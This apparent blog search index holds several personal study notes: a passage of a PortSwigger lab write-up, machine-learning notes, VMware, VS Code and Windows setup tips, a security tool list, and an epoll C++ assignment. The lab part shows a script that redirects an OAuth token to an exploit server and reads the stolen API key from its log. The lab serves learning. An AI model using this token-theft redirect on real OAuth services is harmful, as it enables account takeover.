punctuation">&#123;</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email'</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/?'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ol type="1"><li><strong>window.location:</strong> representing the current browsingcontext, including the current URL</li><li><strong>document.location.hash</strong>: if the current URL is<code>https://example.com/page#section1</code>, the<code>document.location.hash</code> would be<code>#section1</code>.</li><li><strong>substr(1)</strong>: By passing <code>1</code> as theargument, it removes the leading <code>#</code> symbol from the fragmentidentifier</li><li><strong>/?</strong>: This string is prepended to the extractedfragment identifier</li></ol></li><li><p>inspect access log<imgsrc="https://s2.loli.net/2023/12/08/qjJ2rG3ZfmsYT1D.png"alt="image-20231208150921562" /></p></li><li><p>back to: <code>GET /me</code> ,get <code>apikey</code><imgsrc="https://s2.loli.net/2023/12/08/5t4aDx3vs7CXB6G.png"alt="image-20231208151012038" /></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑回归的代价函数简化版</title>
      <link href="/2023/03/04/ml07/"/>
      <url>/2023/03/04/ml07/</url>
      
        <content type="html"><![CDATA[<h3 id="逻辑回归的代价函数简化版">逻辑回归的代价函数简化版</h3><ul><li>代价函数 <span class="math display">\[L(f_{\vec w,b}(\vec x^{(i)}),y^{}(i)) = -y^{x(i)}log(f_{\vecw,b}(x^{(i)})) - (1-y^{(i)})log(1-f_{\vec w,b}(\vec x^{(i)}))\]</span></li></ul><h3 id="逻辑回归中的梯度下降">逻辑回归中的梯度下降</h3><ul><li><p>迭代 $$ w_j = w_j-J(w,b) J(w,b)=_{i=1}<sup>m(f_{w,b}(x</sup>{(i)})-y<sup>{(i)})x_j</sup>{(i)} \</p><p>b =b-J(w,b) J(w,b) =_{i=1}<sup>m(f_{w,b}(x</sup>{(i)})-y^{(i)})$$</p></li></ul><h3 id="过拟合的问题">过拟合的问题</h3><ul><li><p>过拟合，高方差<imgsrc="https://s2.loli.net/2023/03/04/VLv3lpGiAgbjX8F.png"alt="image-20230304020540467" /></p></li><li><p>欠拟合，高偏差</p></li></ul><h3 id="解决过拟合">解决过拟合</h3><ul><li>增加训练数据</li><li>特征选择</li><li>正则化<ul><li>保留所有特征，但是防止特征权重过大</li><li>不需要对b参数正则化</li></ul></li></ul><h3 id="带有正则化的代价函数">带有正则化的代价函数</h3><ul><li><p>不知道 最小化哪些参数，所以通常对所有参数正则化 <spanclass="math display">\[J_{w,b} = \frac1{2m}\begin{matrix} \sum_{i=1}^m(f_{(w,b)}(x^{(i)})-y^{(i)})^2\end{matrix}+\frac{\lambda}{2m}\sum_{j=1}^n w_j^2\]</span></p><ul><li>对于 <span class="math inline">\(\lambda\)</span> 的取值<ul><li>过小：没有正则化</li><li>过大: f=b,欠拟合</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware</title>
      <link href="/2023/02/27/vmware/"/>
      <url>/2023/02/27/vmware/</url>
      
        <content type="html"><![CDATA[<h3 id="使用vmware">使用vmWare</h3><ul><li>Unity 模式（宿主系统上使用虚拟系统的应用）</li><li></li></ul><h3 id="vmware-联网问题">Vmware 联网问题</h3><ul><li>NAT 模式<imgsrc="https://s2.loli.net/2023/03/12/UdxNq3VOY6D8bJn.png"alt="image-20230312184001570" /></li><li>操作步骤<imgsrc="https://s2.loli.net/2023/03/12/oyPRGjIlTEAdgw3.png"alt="image-20230312184342809" /></li><li>在虚拟机系统中：</li></ul><blockquote><ul><li><p>编辑网络接口配置文件： 使用命令 "sudo vi /etc/network/interfaces"打开网络接口配置文件，添加以下配置：</p><pre class="language-bash" data-language="bash"><code class="language-bash">auto eth0 <span class="token comment"># 网络接口名称 </span>iface eth0 inet dhcp <span class="token comment"># 网络接口类型</span></code></pre><ul><li>编辑网络管理器配置文件：</li><li>使用命令<code>sudo vi /etc/NetworkManager/NetworkManager.conf</code>打开网络管理器配置文件，将 <code>managed=false</code>改为<code>managed=true</code>，保存并关闭文件。</li><li>重启网络服务： 使用命令 <code>sudo service networking restart</code>重启网络服务，使配置文件生效。</li><li>报错：ubuntu Unit networking.service is masked<ul><li><code>sudo systemctl unmask networking.service</code></li></ul></li></ul></li></ul></blockquote><ul><li></li></ul><h3 id="桥接nat转换仅主机模式">桥接、NAT转换、仅主机模式</h3><ul><li>桥接<ul><li>虚拟机网卡与主机网卡连接通信，将主机视为一个交换机VMnet0</li></ul></li><li>NAT模式<ul><li>虚拟机借助主机访问网络，主机采用双网卡模式（VMnet1和VMnet8）</li></ul></li><li>仅主机<ul><li>虚拟机通过VMnet1与主机连接，主机将虚拟机与外网隔绝。</li></ul></li></ul><h3 id="xshell-不能连接虚拟机">xshell 不能连接虚拟机</h3><ul><li><p>问题描述：</p><ul><li>主机上无VMnet1和VMnet8</li><li>主机无法ping通虚拟机</li></ul></li><li><p>重复安装vmware ，未卸载干净，需要清理注册表</p></li><li><p>安装ccleaner</p><ul><li>先建立一个<strong>空文件夹</strong>，否则安装空白</li></ul></li><li><p><ahref="https://www.bilibili.com/video/BV1jd4y1w72L/?spm_id_from=333.337.search-card.all.click&amp;vd_source=03c4adad8a71f5349bd0c6db2d174203">安装</a><imgsrc="https://s2.loli.net/2023/02/15/X8M3lgIYWNJv5kq.png"alt="image-20230215142928964" /></p><ul><li><strong>patch 压缩文件内启动</strong></li></ul><figure><img src="https://s2.loli.net/2023/02/15/FQoBrvCuxGmcHXI.png"alt="image-20230215143129296" /><figcaption aria-hidden="true">image-20230215143129296</figcaption></figure></li><li><p>最关键的一步</p><ul><li><p>更改设置<imgsrc="https://s2.loli.net/2023/02/15/SRBqbMPJ6KOLifj.png"alt="image-20230215144316587" /></p></li><li><p>VMnet8 也需要来一遍<imgsrc="https://s2.loli.net/2023/02/15/AMxldjIpNiSQcFC.png"alt="image-20230215144609089" /></p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安工具</title>
      <link href="/2023/02/24/infosec-tools/"/>
      <url>/2023/02/24/infosec-tools/</url>
      
        <content type="html"><![CDATA[<h3 id="命令行工具小工具">命令行工具（小工具）</h3><ul><li>dirsearch</li><li>Git_Extract</li></ul><h3 id="burpsuite">BurpSuite</h3><ul><li><p><ahref="https://www.oracle.com/java/technologies/downloads/#jdk19-windows">Jdk-19安装</a></p><ul><li><p>安装后<imgsrc="https://s2.loli.net/2023/02/24/2gkZWfH5q6rRdLm.png"alt="image-20230224174017795" /></p></li><li><p>环境变量<imgsrc="https://s2.loli.net/2023/02/24/aug3SrjQF2mq4zp.png"alt="image-20230224174102701" /></p><figure><img src="https://s2.loli.net/2023/02/24/VGKCPUf75seLpXh.png"alt="image-20230224174149085" /><figcaption aria-hidden="true">image-20230224174149085</figcaption></figure></li></ul></li><li><p>BurpSuite 安装</p><p><a href="https://www.lilinchao.com/archives/2323.html">教程</a></p><ul><li><p><ahref="https://portswigger.net/burp/releases">release</a></p></li><li><p>[注册机]</p></li><li><p>主题美化 <ahref="https://github.com/CoreyD97/BurpCustomizer/releases">Github</a></p></li></ul></li></ul><h3 id="antsword">AntSword</h3><ul><li><p><ahref="https://github.com/AntSwordProject/AntSword-Loader/releases">加载器</a><ahref="https://github.com/AntSwordProject/antSword/releases">本体</a></p></li><li><p>文件结构<imgsrc="https://s2.loli.net/2023/02/24/YSgxAqGMdOKu5i3.png"alt="image-20230224182245254" /></p></li><li><p>初始化出错<imgsrc="https://s2.loli.net/2023/02/24/w7ELaFUGf8myk6n.png"alt="image-20230224182221513" /></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win11 美化</title>
      <link href="/2023/02/24/win11-mei-hua/"/>
      <url>/2023/02/24/win11-mei-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="字体">字体</h3><ul><li>新宋体，Fira Code</li></ul><h3 id="教程">教程</h3><ul><li><p><ahref="https://www.youtube.com/watch?v=lNfxwfyCHzE&amp;ab_channel=LinkVegas">yotube</a></p><ul><li>注意第一个链接</li></ul></li><li><p>工具包<imgsrc="https://s2.loli.net/2023/02/23/625dlXwSHmbNo91.png"alt="image-20230223025510157" /></p></li><li><p>效果<img src="https://s2.loli.net/2023/02/23/625dlXwSHmbNo91.png"alt="image-20230223030127294" /></p></li><li><p>Dracula theme 调色板<imgsrc="https://s2.loli.net/2023/02/23/EMINRC5Fzey9Bsl.png"alt="image-20230223185257357" /></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGpt</title>
      <link href="/2023/02/23/chatgpt/"/>
      <url>/2023/02/23/chatgpt/</url>
      
        <content type="html"><![CDATA[<h3 id="加入new-bing">加入New bing</h3><ul><li><p><ahref="https://www.microsoft.com/en-us/edge/bing?form=MW00XV&amp;OCID=MW00XV">joinwait list</a></p></li><li><p>进入waitlist(收到第一封邮件)<imgsrc="https://s2.loli.net/2023/02/22/laZzK1C4x73ybeS.png"alt="image-20230222222012575" /></p></li><li><p>正式体验newbing（收到第二封邮件）<imgsrc="https://s2.loli.net/2023/02/22/RWZJYwNyQ9e68CT.png"alt="image-20230222222106091" /></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AIGC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vscode 相关</title>
      <link href="/2023/02/23/vscode/"/>
      <url>/2023/02/23/vscode/</url>
      
        <content type="html"><![CDATA[<h3 id="php">php</h3><ul><li>在html中的php高亮<imgsrc="https://s2.loli.net/2023/05/20/Q4pILZdqC6V5vwF.png"alt="image-20230520210920496" /></li></ul><h3 id="html">Html</h3><ul><li>live server</li></ul><h3 id="vscode-远程连接主机">Vscode 远程连接主机</h3><ul><li><code>remote-ssh</code><ul><li>windows 一般预先安装了ssh</li><li>VsCode<img src="https://s2.loli.net/2023/03/12/IvrG87yemAXRZEM.png"alt="image-20230312231051887" /></li><li>配置文件<imgsrc="https://s2.loli.net/2023/03/12/oCPSndrutsjFkXy.png"alt="image-20230312230928449" /></li></ul></li></ul><h3 id="流程图">流程图</h3><ul><li>Draw.io Integration<ul><li>比在线流程图制作功能更强</li></ul></li></ul><h3 id="ai助写代码">AI助写代码</h3><ul><li>github copilot</li><li>tabnine</li><li>codegeek</li></ul><h3 id="comment-translate">comment translate</h3><ul><li>可以配合deepl翻译</li><li>特点<ul><li>选中翻译（尤其是注释）</li></ul></li></ul><h3 id="cc-extension-pack">C/C++ extension pack</h3><ul><li>写一个cpp文件</li><li>执行</li><li>生成相应的配置文件</li><li>安装MingGw64</li></ul><h3 id="文件管理">文件管理</h3><ul><li>Project Manager</li></ul><h3 id="theme">theme</h3><ul><li>Dracula official</li><li>nord</li><li>dark visual studio</li></ul><h3 id="刷力扣">刷力扣</h3><ul><li><p>插件</p><ul><li><p>Leetcode</p></li><li><p>debug leetcode</p></li></ul></li></ul><h3id="设置vscode代码格式化c时大括号不换行">设置vscode代码格式化c++时大括号不换行</h3><ul><li><p>在setting.json中加入这行代码</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token property">"C_Cpp.clang_format_style"</span><span class="token operator">:</span> <span class="token string">"&#123; BasedOnStyle: Chromium, IndentWidth: 4&#125;"</span></code></pre></li></ul><h3 id="安装mingw64">安装MingW64</h3><ul><li><ahref="https://sourceforge.net/projects/mingw-w64/files/mingw-w64/">地址</a><imgsrc="https://s2.loli.net/2023/02/22/dotxPejI6TaNOvu.png"alt="image-20230222012454189" /></li><li>报错<img src="https://s2.loli.net/2023/02/22/1fyvF9jc2HIlWiS.png"alt="image-20230222013610489" /></li><li><ahref="https://stackoverflow.com/questions/46455927/mingw-w64-installer-the-file-has-been-downloaded-incorrectly">搜索</a></li><li>下载地址<a href="https://winlibs.com/#download-release">2</a><imgsrc="https://s2.loli.net/2023/02/22/HlnWhu4MsrLB2iD.png" /></li><li>写入环境变量<imgsrc="https://s2.loli.net/2023/02/22/9bQuwlB5hLTeqmO.png"alt="image-20230222021511634" /></li></ul><h3 id="去除换行符">去除换行符</h3><ol type="1"><li><code>ctrl+h</code>:</li><li>选择正则匹配</li><li>-&gt;空<img src="https://s2.loli.net/2023/08/18/v8SmFOZDEBcsMzr.png"alt="image-20230818113512990" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Advanced Programming Design</title>
      <link href="/2023/02/23/gao-ji-cheng-xu-she-ji-zuo-ye/"/>
      <url>/2023/02/23/gao-ji-cheng-xu-she-ji-zuo-ye/</url>
      
        <content type="html"><![CDATA[<h3 id="期末">期末</h3><h4 id="总体设计方案">总体设计方案</h4><p>学生专业是网络安全，故提出的设计与安全相关。</p><p>智能安全监控系统是一款能够通过硬件设备、软件系统、算法设计以及人机交互界面的设计实现，主要功能为监测家庭、办公室或工作区的安全状态，实现对入侵、移动、温度等数据的实时监测和报警，同时将监测到的数据进行分析和处理，提供数据分析结果和图像视频流的展示，并通过Web 应用程序进行远程查看。</p><h4 id="硬件设计方案">硬件设计方案</h4><ol type="1"><li><p>树莓派：采用树莓派作为主控板，进行数据的处理和控制。</p></li><li><p>摄像头模块：采用树莓派官方提供的摄像头模块，获取视频数据。</p></li><li><p>温度传感器：采用DS18B20数字温度传感器获取环境温度数据。</p></li><li><p>人体红外传感器：通过人体红外传感器获取区域内是否有人体移动。</p></li><li><p>门磁传感器：通过门磁传感器监测门窗是否被打开。</p></li><li><p>蜂鸣器：用于报警。</p></li></ol><h4 id="软件系统设计方案">软件系统设计方案</h4><ol type="1"><li><p>操作系统：采用Raspbian作为操作系统。</p></li><li><p>图像处理和分析：采用OpenCV库对摄像头获取到的图像进行处理和分析。</p></li><li><p>网络通信：使用Python的socket和Flask或Django等Web框架构建Web应用程序，实现远程查看视频流和传感器数据。</p></li><li><p>数据存储：采用MySQL数据库进行数据存储。</p></li><li><p>数据分析：使用Python语言对获取到的传感器数据进行分析，从而判断是否有安全问题，并给出相应的警告。</p></li></ol><h4 id="算法设计方案">算法设计方案</h4><ol type="1"><li><p>图像识别算法：使用OpenCV库进行图像处理和分析，通过对比前后两张图像的差异来判断是否有人体移动。</p></li><li><p>温度变化算法：通过获取环境温度数据，并将其存储在MySQL数据库中，通过比较不同时间段的温度数据变化，判断是否有异常情况。</p></li><li><p>门窗打开算法：通过门磁传感器获取门窗状态，判断是否有门窗被打开。</p></li></ol><h4 id="算法实现方案">算法实现方案</h4><h5 id="图像识别算法">图像识别算法</h5><ol type="1"><li><p>从摄像头中获取当前帧的图像</p></li><li><p>将当前帧与上一帧的图像进行比较，计算两帧图像的差异</p></li><li><p>对差异图像进行阈值分割处理，得到二值化图像</p></li><li><p>对二值化图像进行连通域分析，判断是否存在连通域面积大于设定值的物体</p></li><li><p>如果存在连通域面积大于设定值的物体，则认为有人体移动，触发报警</p></li></ol><h5 id="温度变化算法">温度变化算法</h5><ol type="1"><li><p>从温度传感器获取当前温度值</p></li><li><p>将当前温度值存储在MySQL数据库中</p></li><li><p>定期查询数据库中的温度数据，计算不同时间段的平均温度值</p></li><li><p>如果某个时间段的平均温度值与前一时间段的平均温度值相差超过设定阈值，则认为存在异常情况，触发报警</p></li></ol><h5 id="门窗打开算法">门窗打开算法</h5><ol type="1"><li><p>从门磁传感器获取当前门窗状态</p></li><li><p>如果当前状态与前一状态不同，并且当前状态为打开，则认为门窗被打开，触发报警</p></li></ol><h4 id="人机交互或界面设计">人机交互（或界面）设计</h4><ol type="1"><li><p>控制面板：可以设计一个控制面板，用于显示系统的状态和警报信息。用户可以通过控制面板控制系统的开关、查看视频流和传感器数据。</p></li><li><p>移动应用程序：可以开发一款移动应用程序，让用户可以在手机上远程查看视频流和传感器数据。用户可以通过应用程序接收系统发送的警报信息。</p></li><li><p>Web界面：可以使用Flask或Django等Web框架构建一个Web应用程序，以便用户可以从任何地方远程查看视频流和传感器数据。Web界面应该设计得简洁易懂，方便用户操作。</p></li><li><p>语音交互：可以使用语音识别技术，让用户可以通过语音命令来控制系统的开关、查看视频流和传感器数据。语音交互设计应该简单明了，方便用户理解。</p></li><li><p>短信提醒：系统可以将警报信息发送到用户的手机上，以便用户及时获得警报信息。</p></li></ol><p>总之，人机交互设计应该注重用户体验，让用户能够方便地使用智能安全监控系统，并及时获得警报信息。</p><h3 id="作业9">作业9</h3><ul><li><p><strong>Epoll</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/epoll.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_EVENTS</span> <span class="token expression"><span class="token number">1024</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUF_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span><span class="token keyword">int</span> <span class="token function">set_nonblocking</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> old_option <span class="token operator">=</span> <span class="token function">fcntl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> F_GETFL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> new_option <span class="token operator">=</span> old_option <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">;</span>    <span class="token function">fcntl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> F_SETFL<span class="token punctuation">,</span> new_option<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> old_option<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">add_fd</span><span class="token punctuation">(</span><span class="token keyword">int</span> epoll_fd<span class="token punctuation">,</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">bool</span> enable_et<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    epoll_event event<span class="token punctuation">;</span>    event<span class="token punctuation">.</span>data<span class="token punctuation">.</span>fd <span class="token operator">=</span> fd<span class="token punctuation">;</span>    event<span class="token punctuation">.</span>events <span class="token operator">=</span> EPOLLIN<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>enable_et<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        event<span class="token punctuation">.</span>events <span class="token operator">|=</span> EPOLLET<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">epoll_ctl</span><span class="token punctuation">(</span>epoll_fd<span class="token punctuation">,</span> EPOLL_CTL_ADD<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">set_nonblocking</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">lt</span><span class="token punctuation">(</span>epoll_event<span class="token operator">*</span> events<span class="token punctuation">,</span> <span class="token keyword">int</span> number<span class="token punctuation">,</span> <span class="token keyword">int</span> epoll_fd<span class="token punctuation">,</span> <span class="token keyword">int</span> listen_fd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> number<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sockfd <span class="token operator">=</span> events<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>fd<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sockfd <span class="token operator">==</span> listen_fd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> client_address<span class="token punctuation">;</span>            socklen_t client_addrlength <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listen_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>client_address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_addrlength<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">add_fd</span><span class="token punctuation">(</span>epoll_fd<span class="token punctuation">,</span> connfd<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>events<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>events <span class="token operator">&amp;</span> EPOLLIN<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"event trigger once\n"</span><span class="token punctuation">;</span>            <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'\0'</span><span class="token punctuation">,</span> BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUF_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">close</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"get "</span> <span class="token operator">&lt;&lt;</span> ret <span class="token operator">&lt;&lt;</span> <span class="token string">" bytes of content: "</span> <span class="token operator">&lt;&lt;</span> buf <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"something else happened\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">et</span><span class="token punctuation">(</span>epoll_event<span class="token operator">*</span> events<span class="token punctuation">,</span> <span class="token keyword">int</span> number<span class="token punctuation">,</span> <span class="token keyword">int</span> epoll_fd<span class="token punctuation">,</span> <span class="token keyword">int</span> listen_fd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> number<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sockfd <span class="token operator">=</span> events<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>fd<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sockfd <span class="token operator">==</span> listen_fd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> client_address<span class="token punctuation">;</span>            socklen_t client_addrlength <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listen_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>client_address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_addrlength<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">add_fd</span><span class="token punctuation">(</span>epoll_fd<span class="token punctuation">,</span> connfd<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>events<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>events <span class="token operator">&amp;</span> EPOLLIN<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"event trigger once\n"</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'\0'</span><span class="token punctuation">,</span> BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUF_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>errno <span class="token operator">==</span> EAGAIN<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> EWOULDBLOCK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"read later\n"</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token function">close</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">close</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    std<span class="token double-colon 